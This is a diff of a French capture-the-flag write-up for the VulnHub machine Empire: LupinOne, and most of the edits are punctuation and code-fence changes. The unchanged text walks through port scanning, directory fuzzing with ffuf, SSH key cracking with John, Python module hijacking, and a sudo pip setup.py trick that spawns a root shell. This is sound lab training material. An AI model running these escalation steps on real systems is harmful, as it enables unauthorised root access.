@@ -8,11 +8,11 @@ Le tour des lieux
 
 [Empire: LupinOne](https://www.vulnhub.com/entry/empire-lupinone,750/) est un CTF de *icex64 & Empire Cybersecurity* téléchargeable sur la plateforme *VulnHub*.  
 
-Le nom *Lupin* fait référence à *Arsène Lupin* mais comme vous le verrez par la suite la thématique n'a pas été trop poussée (ça reste un boot2root).  
+Le nom *Lupin* fait référence à *Arsène Lupin,* mais comme vous le verrez par la suite la thématique n'a pas été trop poussée (ça reste un boot2root).  
 
-On commence comme il se doit par le classique scan de ports:  
+On commence comme il se doit par le classique scan de ports :  
 
-```bash
+```console
 $ sudo nmap -T5 -p- -sC -sV 192.168.2.5 -v -Pn
 
 Nmap scan report for 192.168.2.5
@@ -49,7 +49,7 @@ Armé même de bonnes wordlists, [feroxbuster](https://github.com/epi052/feroxbu
 
 Le dossier *~myfiles* ne contient rien d'intéressant comme vu précédemment mais laisse supposer qu'on peut trouver d'autres dossiers commençant par un tilde (qui est souvent une convention pour les espaces utilisateurs sous Apache). Patator n'ayant pas été mis à jour depuis un moment je me suis rabattu sur le bien connu [ffuf](https://github.com/ffuf/ffuf#readme) :  
 
-```bash
+```console
 $ ffuf -u http://192.168.2.5/~FUZZ -w /tools/fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt
 
         /'___\  /'___\           /'___\       
@@ -110,7 +110,7 @@ Il m'aura fallu un indice pour savoir que le mot à rechercher était *mysecret*
 
 On aurait pu trouver le fichier avec rockyou de cette façon :  
 
-```bash
+```console
 $ ffuf -u http://192.168.2.5/~secret/.FUZZ.txt -w /tools/wordlists/rockyou.txt -mc 200
 ```
 
@@ -123,7 +123,7 @@ Le fichier obtenu n'est pas dans le format classique d'une clé SSH avec le asci
 
 On tente de l'utiliser :  
 
-```bash
+```console
 $ ssh -i /tmp/icex64.key icex64@192.168.2.5
 Load key "/tmp/icex64.key": invalid format
 icex64@192.168.2.5's password:
@@ -145,7 +145,7 @@ Le site dispose d'un décodeur qui cette fois nous retourne la clé privée SSH 
 
 Pour le coup JtR n'en fait qu'une bouchée :  
 
-```bash
+```console
 $ ./john  --wordlist=wordlist.txt  hash.txt 
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
@@ -172,7 +172,7 @@ Je m'intéresse tout de suite aux autres utilisateurs, en particulier Arsène :
 uid=1000(arsene) gid=1000(arsene) groups=1000(arsene),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
 ```
 
-```bash
+```console
 icex64@LupinOne:~$ ls -al /home/arsene
 total 40
 drwxr-xr-x 3 arsene arsene 4096 Oct  4 18:46 .
@@ -207,7 +207,7 @@ Le code Python *heist.py* n'est pas modifiable par nous. Il ne fait qu'utiliser 
 
 Du coup je ne suis pas vraiment surpris de retrouver le module parmi la liste des fichiers que je peux modifier :  
 
-```bash
+```console
 $ find / -writable 2> /dev/null  | grep -v /proc | grep -v /run
 
 --- snip ---
@@ -218,7 +218,7 @@ $ find / -writable 2> /dev/null  | grep -v /proc | grep -v /run
 
 Maintenant comment lancer *heist.py* avec les droits d'Arsène ? Tâche planifiée ? En fait l'autorisation est donnée via sudo :  
 
-```bash
+```console
 $ sudo -l
 Matching Defaults entries for icex64 on LupinOne:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -243,16 +243,16 @@ os.chmod("/home/arsene/.ssh/authorized_keys", stat.S_IREAD|stat.S_IWRITE)
 Trophé
 ------
 
-Une fois connecté en tant que Arsène ou peut lire le fichier secret :  
+Une fois connecté en tant qu'Arsène ou peut lire le fichier secret :  
 
-```bash
+```console
 arsene@LupinOne:~$ cat .secret 
 I dont like to forget my password "rQ8EE"UK,eV)weg~*nd-`5:{*"j7*Q"
 ```
 
 Que peut-on faire avec un mot de passe ? Commençons par regarder du côté de sudo:  
 
-```bash
+```console
 arsene@LupinOne:~$ sudo -l
 Matching Defaults entries for arsene on LupinOne:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -261,11 +261,11 @@ User arsene may run the following commands on LupinOne:
     (root) NOPASSWD: /usr/bin/pip
 ```
 
-L'entrée sudo ce n'est pas très original mais cette fois la commande à exploiter c'est *pip* (le gestionnaire de paquets de Python), ça change :)  
+L'entrée sudo ce n'est pas très original, mais cette fois la commande à exploiter c'est *pip* (le gestionnaire de paquets de Python), ça change :)  
 
 On trouve une astuce permettant d'avoir un shell sur [gtfobins](https://gtfobins.github.io/gtfobins/pip/#shell) :  
 
-```bash
+```console
 arsene@LupinOne:~$ TF=$(mktemp -d)
 echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
 arsene@LupinOne:~$ sudo /usr/bin/pip install $TF
